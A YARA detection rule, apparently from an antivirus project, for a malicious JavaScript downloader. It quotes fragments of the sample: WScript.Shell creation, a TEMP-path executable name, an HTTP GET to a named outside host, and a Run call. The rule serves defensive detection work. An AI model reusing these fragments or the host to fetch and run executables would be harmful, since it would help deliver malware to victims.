rule sig_20160328_1eab60608283f4db2a32d2802fd3a7c8 {
  meta:
    description = "datamaliciousorder - file 20160328_1eab60608283f4db2a32d2802fd3a7c8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cbb273bf43e0ec7728531d03545bb3f13984eea4055f97fce0e13eb94b8407a3"

  strings:
    $s1  = "function Ffqbssifb() {return Henhxe[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"wJszIq03cpx.exe\";};" fullword ascii
    $s2  = "Vckbqtjkc[Vnpelz](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Bfexkrnkem](Ebpcqhrpr() * 11)} while (Vckbqtjkc[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Henhxe = function Jwtgxsm() {return WScript[Pbcby](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Mmblku(Tnstbdrmew, Ghdqewa){return Tnstbdrmew - Ghdqewa;};" fullword ascii
    $s6  = "function Oogcdusgad(Etwqguma){Henhxe[\"Run\"](Etwqguma, Oedcwvfm, Oedcwvfm);};" fullword ascii
    $s7  = "function Cyiwv() {return ((Ugkmlfd == true) && (Ugkmlfd == Ffyuiui)) ? 1 : Oedcwvfm;};" fullword ascii
    $s8  = "Ugkmlfd = true; " fullword ascii
    $s9  = "return Mmblku(Mdwfqhgffb, Nxhzu);" fullword ascii
    $s10 = "function Qyellguz(){return Fypqp;};" fullword ascii
    $s11 = "function Jqbwkrfg(Qcvqc) {var Yokouq = (1, 2, 3, 4, 5, Qcvqc); return Yokouq;};" fullword ascii
    $s12 = "var Wdpjqtutwg = false;" fullword ascii
    $s13 = "function Ebpcqhrpr(){return 22;};" fullword ascii
    $s14 = "var Ffyuiui = false;" fullword ascii
    $s15 = "function Giqfgqlnud(){return Pbcby;};" fullword ascii
    $s16 = "var Ugkmlfd = false;" fullword ascii
    $s17 = "function Furuitj()" fullword ascii
    $s18 = "Ffyuiui = true; " fullword ascii
    $s19 = "var Prddyhy = new this[\"Date\"]();" fullword ascii
    $s20 = " while (Iccimr){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}